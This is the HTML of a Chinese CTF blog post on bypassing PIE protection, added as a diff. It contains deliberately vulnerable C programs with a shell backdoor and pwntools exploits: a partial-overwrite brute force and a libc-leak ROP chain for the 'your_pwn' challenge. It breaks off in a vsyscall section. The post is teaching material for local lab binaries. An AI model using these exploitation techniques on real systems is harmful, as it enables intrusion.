@@ -1,0 +1,675 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Ak0er">
+  <meta name="keywords" content="zh-CN">
+  
+    <meta name="description" content="PIE保护PIE全称是position-independent executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址，从而不能通过ROPgadget等一些工具来帮助解题 下面通过一个例子来具体看一下PIE的效果 程序源码 1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pie保护">
+<meta property="og:url" content="http://ak0er.github.io/2024/05/04/pie%E4%BF%9D%E6%8A%A4/index.html">
+<meta property="og:site_name" content="Ak0er">
+<meta property="og:description" content="PIE保护PIE全称是position-independent executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址，从而不能通过ROPgadget等一些工具来帮助解题 下面通过一个例子来具体看一下PIE的效果 程序源码 1">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20231215192433736.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20231215192452070.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20231215192610010.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20231215192644086.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20231215192836254.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20231215192754735.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20231215192739784.png">
+<meta property="article:published_time" content="2024-05-04T00:52:37.000Z">
+<meta property="article:modified_time" content="2024-05-10T12:54:57.434Z">
+<meta property="article:author" content="Ak0er">
+<meta property="article:tag" content="zh-CN">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20231215192433736.png">
+  
+  
+  
+  <title>pie保护 - Ak0er</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"ak0er.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="pie保护"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-05-04 08:52" pubdate>
+          2024年5月4日 早上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          17 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">pie保护</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="PIE保护"><a href="#PIE保护" class="headerlink" title="PIE保护"></a>PIE保护</h2><p>PIE全称是position-independent executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址，从而不能通过ROPgadget等一些工具来帮助解题</p>
+<p>下面通过一个例子来具体看一下PIE的效果</p>
+<p>程序源码</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">houmen</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;cat flag&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">vuln</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">char</span> a[<span class="hljs-number">20</span>];<br>    <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>,a,<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">puts</span>(a);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> <span class="hljs-type">const</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">vuln</span>();    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>编译命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -fno-stack-protector -no-pie -s test.c -o <span class="hljs-built_in">test</span>        <span class="hljs-comment">#不开启PIE保护</span><br></code></pre></td></tr></table></figure>
+
+<p>不开启PIE保护的时候每次运行时加载地址不变</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20231215192433736.png" srcset="/img/loading.gif" lazyload alt="image-20231215192433736"></p>
+<p>开启PIE保护的时候每次运行时加载地址是随机变化的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20231215192452070.png" srcset="/img/loading.gif" lazyload alt="image-20231215192452070"></p>
+<h2 id="一、partial-write"><a href="#一、partial-write" class="headerlink" title="一、partial write"></a>一、partial write</h2><p>partial write就是利用了PIE技术的缺陷。我们知道，内存是以页载入机制，如果开启PIE保护的话，只能影响到单个内存页，一个内存页大小为0x1000，那么就意味着不管地址怎么变，某一条指令的后三位十六进制数的地址是始终不变的。因此我们可以通过覆盖地址的后几位来可以控制程序的流程</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">houmen</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">vuln</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">char</span> a[<span class="hljs-number">20</span>];<br>    <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>,a,<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">puts</span>(a);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> <span class="hljs-type">const</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">vuln</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-meta"># gcc -m32 -fno-stack-protector  -s test.c -o test</span><br></code></pre></td></tr></table></figure>
+
+<p>明显的栈溢出，通过gdb调试，直接来到vuln函数的ret处，可以看到houmen函数的地址和返回地址只有后几位不一样，那么我们覆盖地址的后4位即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20231215192610010.png" srcset="/img/loading.gif" lazyload alt="image-20231215192610010"></p>
+<p>由于地址的后3位一样，所以覆盖的话至少需要4位，那么倒数第四位就需要爆破，爆破范围在0到0xf</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding:utf-8</span><br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;deepin-terminal&#x27;</span>, <span class="hljs-string">&#x27;-x&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span> ,<span class="hljs-string">&#x27;-c&#x27;</span>]<br><br>offset = <span class="hljs-number">0x1c</span>+<span class="hljs-number">4</span><br>list1 = [<span class="hljs-string">&quot;x05&quot;</span>,<span class="hljs-string">&quot;x15&quot;</span>,<span class="hljs-string">&quot;x25&quot;</span>,<span class="hljs-string">&quot;x35&quot;</span>,<span class="hljs-string">&quot;x45&quot;</span>,<span class="hljs-string">&quot;x55&quot;</span>,<span class="hljs-string">&quot;x65&quot;</span>,<span class="hljs-string">&quot;x75&quot;</span>,<span class="hljs-string">&quot;x85&quot;</span>,<span class="hljs-string">&quot;x95&quot;</span>,<span class="hljs-string">&quot;xa5&quot;</span>,<span class="hljs-string">&quot;xb5&quot;</span>,<span class="hljs-string">&quot;xc5&quot;</span>,<span class="hljs-string">&quot;xd5&quot;</span>,<span class="hljs-string">&quot;xe5&quot;</span>,<span class="hljs-string">&quot;xf5&quot;</span>]<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        p = process(<span class="hljs-string">&quot;./test&quot;</span>)<br>        payload = offset*<span class="hljs-string">&quot;a&quot;</span>+<span class="hljs-string">&quot;x7d&quot;</span>+random.sample(list1,<span class="hljs-number">1</span>)[<span class="hljs-number">0</span>]<br>        p.send(payload)<br>        p.recv()<br>        p.recv()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        p.close()<br>        <span class="hljs-built_in">print</span> e<br></code></pre></td></tr></table></figure>
+
+<p>可以很快的得到爆破的结果</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20231215192644086.png" srcset="/img/loading.gif" lazyload alt="image-20231215192644086"></p>
+<h2 id="二、泄露地址"><a href="#二、泄露地址" class="headerlink" title="二、泄露地址"></a>二、泄露地址</h2><p>开启PIE保护的话影响的是程序加载的基地址，不会影响指令间的相对地址，因此我们如果能够泄露出程序或者libc的某些地址，我们就可以利用偏移来构造ROP</p>
+<p>以国赛your_pwn作为例子，该程序保护全开，漏洞点在sub_B35函数，index索引没有控制大小，所以导致任意地址读和任意地址写。</p>
+<p>泄露libc地址和泄露程序基地址的方法是在main函数栈帧中有一个__libc_start_main+231和push r15，可以通过泄露这两个地址计算出libc基地址和程序加载基地址</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20231215192836254.png" srcset="/img/loading.gif" lazyload alt="image-20231215192836254"></p>
+<p>exp：（需要用到LibcSearcher）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding:utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;deepin-terminal&#x27;</span>, <span class="hljs-string">&#x27;-x&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span> ,<span class="hljs-string">&#x27;-c&#x27;</span>]<br>r = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br>__libc_start_main_231_offset = <span class="hljs-number">0x150</span>+<span class="hljs-number">296</span><br><br>r.recvuntil(<span class="hljs-string">&quot;name:&quot;</span>)<br>r.sendline(<span class="hljs-string">&quot;radish&quot;</span>)<br>__libc_start_main_231_addr = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-comment"># leak __libc_start_main_231_addr</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;input indexn&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(__libc_start_main_231_offset+x))<br>    r.recvuntil(<span class="hljs-string">&quot;(hex) &quot;</span>)<br>    data = r.recvuntil(<span class="hljs-string">&quot;n&quot;</span>,drop=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data)&gt;<span class="hljs-number">2</span>:<br>        data = data[-<span class="hljs-number">2</span>:]<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(data)==<span class="hljs-number">1</span>:<br>        data = <span class="hljs-string">&quot;0&quot;</span>+data<br>    __libc_start_main_231_addr = data+__libc_start_main_231_addr<br>    r.recvuntil(<span class="hljs-string">&quot;input new value&quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;0&quot;</span>)<br>log.info(<span class="hljs-string">&quot;__libc_start_main_231_addr -&gt;&gt; &quot;</span>+__libc_start_main_231_addr)<br>__libc_start_main_231_addr = <span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;0x&quot;</span>+__libc_start_main_231_addr)<br><br><br>push_r15_offset = <span class="hljs-number">0x150</span>+<span class="hljs-number">288</span><br>push_r15_addr = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;input indexn&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(push_r15_offset+x))<br>    r.recvuntil(<span class="hljs-string">&quot;(hex) &quot;</span>)<br>    data = r.recvuntil(<span class="hljs-string">&quot;n&quot;</span>,drop=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data)&gt;<span class="hljs-number">2</span>:<br>        data = data[-<span class="hljs-number">2</span>:]<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(data)==<span class="hljs-number">1</span>:<br>        data = <span class="hljs-string">&quot;0&quot;</span>+data<br>    push_r15_addr = data+push_r15_addr<br>    r.recvuntil(<span class="hljs-string">&quot;input new valuen&quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;0&quot;</span>)<br>log.info(<span class="hljs-string">&quot;push_r15_addr -&gt;&gt; &quot;</span>+push_r15_addr)<br>push_r15_addr = <span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;0x&quot;</span>+push_r15_addr)<br><br>main_addr = push_r15_addr - <span class="hljs-number">0x23b</span><br><br><span class="hljs-comment"># cover ret_addr</span><br>offset = <span class="hljs-number">0x150</span>+<span class="hljs-number">8</span><br>main_addr = p64(main_addr).encode(<span class="hljs-string">&quot;hex&quot;</span>)<br><span class="hljs-built_in">print</span> main_addr<br>num = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;input indexn&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(offset+x))<br>    r.recvuntil(<span class="hljs-string">&quot;input new valuen&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;0x&quot;</span>+main_addr[num:num+<span class="hljs-number">2</span>])))<br>    <span class="hljs-built_in">print</span> <span class="hljs-built_in">str</span>(<span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;0x&quot;</span>+main_addr[num:num+<span class="hljs-number">2</span>]))<br>    num = num + <span class="hljs-number">2</span><br><br>log.info(<span class="hljs-string">&quot;------------------- success cover! -------------------&quot;</span>)<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">41</span>-<span class="hljs-number">24</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;input indexn&quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;0&quot;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;input new valuen&quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;0&quot;</span>)<br><br>r.recv()<br>r.sendline(<span class="hljs-string">&quot;yes&quot;</span>)<br>r.recv()<br><br>log.info(<span class="hljs-string">&quot;------------------- ret main success ---------------&quot;</span>)<br><br>pop_rdi_addr =  <span class="hljs-number">99</span>+push_r15_addr<br><br>__libc_start_main_addr = __libc_start_main_231_addr-<span class="hljs-number">231</span><br><span class="hljs-comment"># libc = LibcSearcher(&quot;__libc_start_main&quot;,__libc_start_main_addr)</span><br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>base_addr = __libc_start_main_addr-libc.symbols[<span class="hljs-string">&quot;__libc_start_main&quot;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base_addr)<br>system_addr = libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]+base_addr<br>bin_sh_addr = <span class="hljs-number">0x000000000017d3f3</span>+base_addr<br>log.info(<span class="hljs-string">&quot;system_addr: &quot;</span>+<span class="hljs-built_in">hex</span>(system_addr))<br>log.info(<span class="hljs-string">&quot;bin_sh_addr: &quot;</span>+<span class="hljs-built_in">hex</span>(bin_sh_addr))<br><br>payload = (p64(pop_rdi_addr)+p64(bin_sh_addr)+p64(system_addr)).encode(<span class="hljs-string">&quot;hex&quot;</span>)<br><span class="hljs-built_in">print</span> payload<br><br>r.sendline(<span class="hljs-string">&quot;radish&quot;</span>)<br><br>num = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">24</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;input indexn&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(offset+x))<br>    r.recvuntil(<span class="hljs-string">&quot;input new valuen&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;0x&quot;</span>+payload[num:num+<span class="hljs-number">2</span>])))<br>    <span class="hljs-built_in">print</span> <span class="hljs-built_in">str</span>(<span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;0x&quot;</span>+payload[num:num+<span class="hljs-number">2</span>]))<br>    num = num + <span class="hljs-number">2</span><br><br>log.info(<span class="hljs-string">&quot;------------------- cover payload success ---------------&quot;</span>)<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">41</span>-<span class="hljs-number">24</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;input indexn&quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;0&quot;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;input new valuen&quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;0&quot;</span>)<br>r.recv()<br><span class="hljs-comment">#gdb.attach(r)</span><br>r.sendline(<span class="hljs-string">&quot;yes&quot;</span>)<br>sleep(<span class="hljs-number">0.2</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="三、vdso-vsyscall"><a href="#三、vdso-vsyscall" class="headerlink" title="三、vdso&#x2F;vsyscall"></a>三、vdso&#x2F;vsyscall</h2><p>vsyscall是什么呢？</p>
+<p>通过查阅资料得知，vsyscall是第一种也是最古老的一种用于加快系统调用的机制，工作原理十分简单，许多硬件上的操作都会被包装成内核函数，然后提供一个接口，供用户层代码调用，这个接口就是我们常用的int 0x80和syscall+调用号。</p>
+<p>当通过这个接口来调用时，由于需要进入到内核去处理，因此为了保证数据的完整性，需要在进入内核之前把寄存器的状态保存好，然后进入到内核状态运行内核函数，当内核函数执行完的时候会将返回结果放到相应的寄存器和内存中，然后再对寄存器进行恢复，转换到用户层模式。</p>
